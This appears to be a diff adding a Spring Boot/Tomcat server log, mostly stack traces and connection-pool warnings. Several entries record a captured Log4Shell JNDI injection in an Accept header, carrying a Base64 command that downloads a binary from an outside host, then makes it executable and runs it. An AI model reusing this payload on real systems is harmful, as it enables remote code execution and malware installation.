+	at org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:63) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:116) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:103) [spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.context.SecurityContextPersistenceFilter.doFilter(SecurityContextPersistenceFilter.java:105) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:103) [spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:215) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:178) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:358) [spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:271) [spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) [spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) [spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:103) [spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:103) [spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:710) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationDispatcher.processRequest(ApplicationDispatcher.java:459) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationDispatcher.doForward(ApplicationDispatcher.java:384) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationDispatcher.forward(ApplicationDispatcher.java:312) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.StandardHostValve.custom(StandardHostValve.java:398) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.StandardHostValve.status(StandardHostValve.java:257) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:179) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:78) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:357) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:374) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1707) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) [na:1.8.0_311]
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) [na:1.8.0_311]
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.lang.Thread.run(Thread.java:748) [na:1.8.0_311]
+
+2022-02-03 23:32:59.481  WARN 8250 --- [nio-8081-exec-9] .w.s.m.s.DefaultHandlerExceptionResolver : Resolved [org.springframework.web.HttpMediaTypeNotAcceptableException: Could not parse 'Accept' header [${jndi:ldap://89.163.206.163:1389/TomcatBypass/Command/Base64/Y3VybCAiaHR0cDovLzEwMy40NS42NS4xOTE6NjU3Ni9zcG9vZmhvc3RpbmciIC1vIG5wbXMgICYmIGNobW9kIDc3NyBucG1zICYmIC4vbnBtcyAm}]: Invalid mime type "${jndi:ldap://89.163.206.163:1389/TomcatBypass/Command/Base64/Y3VybCAiaHR0cDovLzEwMy40NS42NS4xOTE6NjU3Ni9zcG9vZmhvc3RpbmciIC1vIG5wbXMgICYmIGNobW9kIDc3NyBucG1zICYmIC4vbnBtcyAm}": Invalid token character '{' in token "${jndi:ldap:"]
+2022-02-03 23:32:59.726  WARN 8250 --- [nio-8081-exec-5] .m.m.a.ExceptionHandlerExceptionResolver : Failure in @ExceptionHandler org.springframework.boot.autoconfigure.web.servlet.error.BasicErrorController#mediaTypeNotAcceptable(HttpServletRequest)
+
+org.springframework.web.HttpMediaTypeNotAcceptableException: Could not parse 'Accept' header [${jndi:ldap://89.163.206.163:1389/TomcatBypass/Command/Base64/Y3VybCAiaHR0cDovLzEwMy40NS42NS4xOTE6NjU3Ni9zcG9vZmhvc3RpbmciIC1vIG5wbXMgICYmIGNobW9kIDc3NyBucG1zICYmIC4vbnBtcyAm}]: Invalid mime type "${jndi:ldap://89.163.206.163:1389/TomcatBypass/Command/Base64/Y3VybCAiaHR0cDovLzEwMy40NS42NS4xOTE6NjU3Ni9zcG9vZmhvc3RpbmciIC1vIG5wbXMgICYmIGNobW9kIDc3NyBucG1zICYmIC4vbnBtcyAm}": Invalid token character '{' in token "${jndi:ldap:"
+	at org.springframework.web.accept.HeaderContentNegotiationStrategy.resolveMediaTypes(HeaderContentNegotiationStrategy.java:59) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.accept.ContentNegotiationManager.resolveMediaTypes(ContentNegotiationManager.java:128) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.mvc.method.annotation.AbstractMessageConverterMethodProcessor.getAcceptableMediaTypes(AbstractMessageConverterMethodProcessor.java:386) ~[spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.mvc.method.annotation.AbstractMessageConverterMethodProcessor.writeWithMessageConverters(AbstractMessageConverterMethodProcessor.java:216) ~[spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.mvc.method.annotation.HttpEntityMethodProcessor.handleReturnValue(HttpEntityMethodProcessor.java:219) ~[spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.method.support.HandlerMethodReturnValueHandlerComposite.handleReturnValue(HandlerMethodReturnValueHandlerComposite.java:82) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:123) ~[spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.mvc.method.annotation.ExceptionHandlerExceptionResolver.doResolveHandlerMethodException(ExceptionHandlerExceptionResolver.java:407) ~[spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.handler.AbstractHandlerMethodExceptionResolver.doResolveException(AbstractHandlerMethodExceptionResolver.java:61) [spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.handler.AbstractHandlerExceptionResolver.resolveException(AbstractHandlerExceptionResolver.java:141) [spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.handler.HandlerExceptionResolverComposite.resolveException(HandlerExceptionResolverComposite.java:80) [spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.DispatcherServlet.processHandlerException(DispatcherServlet.java:1300) [spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.DispatcherServlet.processDispatchResult(DispatcherServlet.java:1111) [spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1057) [spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:943) [spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) [spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:898) [spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at javax.servlet.http.HttpServlet.service(HttpServlet.java:626) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) [spring-webmvc-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at javax.servlet.http.HttpServlet.service(HttpServlet.java:733) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:227) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:320) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.invoke(FilterSecurityInterceptor.java:115) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.doFilter(FilterSecurityInterceptor.java:90) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:118) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:84) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:111) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:158) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:63) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:116) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:103) [spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.context.SecurityContextPersistenceFilter.doFilter(SecurityContextPersistenceFilter.java:105) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:103) [spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:215) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:178) [spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:358) [spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:271) [spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) [spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) [spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:103) [spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:103) [spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:710) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationDispatcher.processRequest(ApplicationDispatcher.java:459) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationDispatcher.doForward(ApplicationDispatcher.java:384) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationDispatcher.forward(ApplicationDispatcher.java:312) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.StandardHostValve.custom(StandardHostValve.java:398) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.StandardHostValve.status(StandardHostValve.java:257) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:179) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:78) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:357) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:374) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1707) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) [na:1.8.0_311]
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) [na:1.8.0_311]
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.lang.Thread.run(Thread.java:748) [na:1.8.0_311]
+
+2022-02-03 23:32:59.727  WARN 8250 --- [nio-8081-exec-5] .w.s.m.s.DefaultHandlerExceptionResolver : Resolved [org.springframework.web.HttpMediaTypeNotAcceptableException: Could not parse 'Accept' header [${jndi:ldap://89.163.206.163:1389/TomcatBypass/Command/Base64/Y3VybCAiaHR0cDovLzEwMy40NS42NS4xOTE6NjU3Ni9zcG9vZmhvc3RpbmciIC1vIG5wbXMgICYmIGNobW9kIDc3NyBucG1zICYmIC4vbnBtcyAm}]: Invalid mime type "${jndi:ldap://89.163.206.163:1389/TomcatBypass/Command/Base64/Y3VybCAiaHR0cDovLzEwMy40NS42NS4xOTE6NjU3Ni9zcG9vZmhvc3RpbmciIC1vIG5wbXMgICYmIGNobW9kIDc3NyBucG1zICYmIC4vbnBtcyAm}": Invalid token character '{' in token "${jndi:ldap:"]
+2022-02-04 17:55:21.138  INFO 8250 --- [nio-8081-exec-5] o.apache.coyote.http11.Http11Processor   : Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+
+java.lang.IllegalArgumentException: Invalid character found in method name [2380x00ll|'|'|SGFjS2VkX0Q3NUU2QUFB|'|'|WIN-QZN7FJ7D1O|'|'|Administrator|'|'|18-11-28|'|'||'|'|Win]. HTTP method names must be tokens
+	at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:417) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:261) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1707) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) [na:1.8.0_311]
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) [na:1.8.0_311]
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.lang.Thread.run(Thread.java:748) [na:1.8.0_311]
+
+2022-02-05 10:57:06.922  WARN 8250 --- [nio-8081-exec-4] com.zaxxer.hikari.pool.PoolBase          : HikariPool-1 - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@3e90a5ad (No operations allowed after connection closed.). Possibly consider using a shorter maxLifetime value.
+2022-02-05 10:57:06.931  WARN 8250 --- [nio-8081-exec-4] com.zaxxer.hikari.pool.PoolBase          : HikariPool-1 - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@3a300d72 (No operations allowed after connection closed.). Possibly consider using a shorter maxLifetime value.
+2022-02-05 10:57:06.936  WARN 8250 --- [nio-8081-exec-4] com.zaxxer.hikari.pool.PoolBase          : HikariPool-1 - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@25bbf79d (No operations allowed after connection closed.). Possibly consider using a shorter maxLifetime value.
+2022-02-05 11:06:23.714  WARN 8250 --- [nio-8081-exec-3] com.zaxxer.hikari.pool.PoolBase          : HikariPool-1 - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@643ca21b (No operations allowed after connection closed.). Possibly consider using a shorter maxLifetime value.
+2022-02-05 11:06:23.721  WARN 8250 --- [nio-8081-exec-3] com.zaxxer.hikari.pool.PoolBase          : HikariPool-1 - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@766e1cd0 (No operations allowed after connection closed.). Possibly consider using a shorter maxLifetime value.
+2022-02-05 18:58:52.591  INFO 8250 --- [nio-8081-exec-7] o.apache.coyote.http11.Http11Processor   : Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+
+java.lang.IllegalArgumentException: Invalid character found in method name [0x160x030x010x00u0x010x000x00q0x030x030x100x90}()Jd0xef0x1b0xc8o*g\0xef0xe00xdc0xa2~"0xbb2!0x0e0xbd0xbf0xcf0x080x1d0xc00xa040x000x000x1a0xc0/0xc0+0xc00x110xc00x070xc00x130xc00x090xc00x140xc00x0a0x000x050x00/0x0050xc00x120x000x0a0x010x000x00.0x000x050x000x050x010x000x000x000x000x000x0a0x000x080x000x060x000x170x000x180x000x190x000x0b0x000x020x010x000x000x0d0x000x0a0x000x080x040x010x040x030x020x010x020x030xff0x010x000x01...]. HTTP method names must be tokens
+	at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:417) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:261) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1707) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) [na:1.8.0_311]
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) [na:1.8.0_311]
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.lang.Thread.run(Thread.java:748) [na:1.8.0_311]
+
+2022-02-06 16:19:44.353  INFO 8250 --- [nio-8081-exec-6] o.apache.coyote.http11.Http11Processor   : Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+
+java.lang.IllegalArgumentException: Invalid character found in method name [0x160x030x010x000xee0x010x000x000xea0x030x030x1a2x0xe7t0xe0(0xa60xd10xd4G0xb0310xaa0xfe0xf80x18/0x970xe30xb5v)00xd70x97YC0xce0x860xcf]. HTTP method names must be tokens
+	at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:417) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:261) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1707) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) [na:1.8.0_311]
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) [na:1.8.0_311]
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.lang.Thread.run(Thread.java:748) [na:1.8.0_311]
+
+2022-02-07 03:07:49.006  INFO 8250 --- [nio-8081-exec-6] o.apache.coyote.http11.Http11Processor   : Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+
+java.lang.IllegalArgumentException: Invalid character found in method name [0x160x030x010x000x8d0x010x000x000x890x030x030xfa0x000x9f0xac>0xd50x9d{80xf1|0x09#p0xdbS&0xa7D0x08I0xbe0xae0xf0pa0x07p0xcc0xddTc0x000x000x1a0xc0/0xc0+0xc00x110xc00x070xc00x130xc00x090xc00x140xc00x0a0x000x050x00/0x0050xc00x120x000x0a0x010x000x00F0x000x000x000x140x000x120x000x000x0f114.115.131.1200x000x050x000x050x010x000x000x000x000x000x0a0x000x080x000x060x000x170x000x180x000x190x000x0b0x000x020x010x000x000x0d0x000x0a0x000x080x040x010x040x030x020x010x020x030xff0x010x000x01...]. HTTP method names must be tokens
